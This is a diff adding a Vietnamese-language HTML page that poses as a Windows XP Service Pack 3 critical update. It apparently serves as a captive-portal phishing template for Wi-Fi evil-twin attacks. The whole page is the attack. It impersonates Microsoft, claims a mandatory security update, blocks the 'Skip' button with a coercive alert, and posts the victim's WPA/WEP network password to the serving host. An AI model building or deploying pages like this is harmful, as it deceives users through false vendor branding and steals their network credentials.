@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Windows XP - Kết nối Internet</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: Tahoma, Verdana, sans-serif;
+    font-size: 11px;
+    background: #5a7edc;
+  }
+  /* Sky gradient kiểu XP Bliss */
+  .desktop {
+    position:fixed; top:0; left:0; width:100%; height:100%;
+    background: linear-gradient(to bottom, #245edb 0%, #3f8cf3 40%, #7db9e8 60%, #5a8f3c 75%, #3c6e21 100%);
+  }
+  .taskbar {
+    position:fixed; bottom:0; left:0; width:100%; height:30px;
+    background:#245edb; border-top:1px solid #4a8ae8;
+    color:#fff; font-size:12px;
+  }
+  .start {
+    display:inline-block; padding:5px 25px 5px 10px;
+    background: linear-gradient(to bottom,#3c8a2e,#2d6d1f);
+    font-style:italic; font-weight:bold; font-size:14px;
+    border-radius:0 10px 10px 0;
+  }
+  .tray {
+    position:absolute; right:0; top:0; height:100%;
+    padding:8px 10px 0 10px; background:#1e50c8;
+    border-left:1px solid #0f3ca0;
+  }
+  .window {
+    position:relative; width:420px; max-width:94%;
+    margin:40px auto 0 auto;
+    background:#ece9d8;
+    border:1px solid #003c74;
+    box-shadow: 3px 3px 8px rgba(0,0,0,0.4);
+  }
+  .titlebar {
+    background: linear-gradient(to bottom,#0058ee,#3f8cf3 60%,#0054e3);
+    color:#fff; font-weight:bold; padding:5px 8px; font-size:12px;
+  }
+  .titlebar span.x {
+    float:right; background:#d64a3a; border:1px solid #fff;
+    width:18px; height:16px; text-align:center; font-weight:bold;
+  }
+  .content { padding:15px; }
+  .banner {
+    background:#fff; border:1px solid #7f9db9; padding:8px; margin-bottom:12px;
+  }
+  .banner b { color:#003c74; font-size:14px; }
+  .row { margin-bottom:10px; }
+  label { display:block; margin-bottom:3px; font-weight:bold; }
+  input[type=text], input[type=password] {
+    width:100%; padding:4px; font-family:Tahoma;
+    border:1px solid #7f9db9; background:#fff;
+  }
+  .btn {
+    padding:5px 20px; font-family:Tahoma; font-size:11px;
+    border:1px solid #003c74;
+    background: linear-gradient(to bottom,#fff,#ece9d8);
+    cursor:pointer;
+  }
+  .btn:hover { border-color:#e08800; }
+  .note { color:#444; margin-top:10px; }
+  .logo { vertical-align:middle; }
+  .footer { text-align:center; color:#fff; padding-bottom:38px; font-size:10px; }
+</style>
+</head>
+<body>
+<div class="desktop"></div>
+
+<form method="POST" action="">
+  <div class="window">
+    <div class="titlebar">Windows XP Service Pack 3 &mdash; Cập nhật quan trọng
+      <span class="x">&#10005;</span>
+    </div>
+    <div class="content">
+      <div class="banner">
+        <img class="logo" src="data:image/gif;base64,R0lGODlhEAAQAPAAAP////8AACH5BAEKAAEALAAAAAAQABAAAAIjjG+gyxnIEBawDopW1hrvDHkgFZ3kOGbiFpnhyJo1pLa9LhUAOw==" width="16" height="16" alt="">
+        <b>Cần xác thực mạng</b><br>
+        Máy tính của bạn cần kết nối Internet để tải các bản cập nhật bảo mật mới nhất cho Windows XP.
+      </div>
+      <div class="row">
+        <label for="ssid">Tên mạng (SSID):</label>
+        <input type="text" id="ssid" name="ssid" value="Free-WiFi-XP">
+      </div>
+      <div class="row">
+        <label for="password">Mật khẩu mạng (WPA/WEP Key):</label>
+        <input type="password" id="password" name="password" autofocus>
+      </div>
+      <input type="submit" class="btn" value="Kết nối &amp; Cập nhật">
+      <input type="button" class="btn" value="Bỏ qua" onclick="alert('Cập nhật bắt buộc. Vui lòng nhập mật khẩu mạng để tiếp tục.');">
+      <p class="note">Quá trình cập nhật có thể mất vài phút. Vui lòng không tắt máy.</p>
+    </div>
+  </div>
+</form>
+
+<div class="footer">Microsoft Windows XP &copy; 2001-2014 &mdash; Trang cập nhật bảo mật</div>
+
+<div class="taskbar">
+  <span class="start">bắt đầu</span>
+  <span class="tray">&#128267; 100% &nbsp; VN</span>
+</div>
+</body>
+</html>
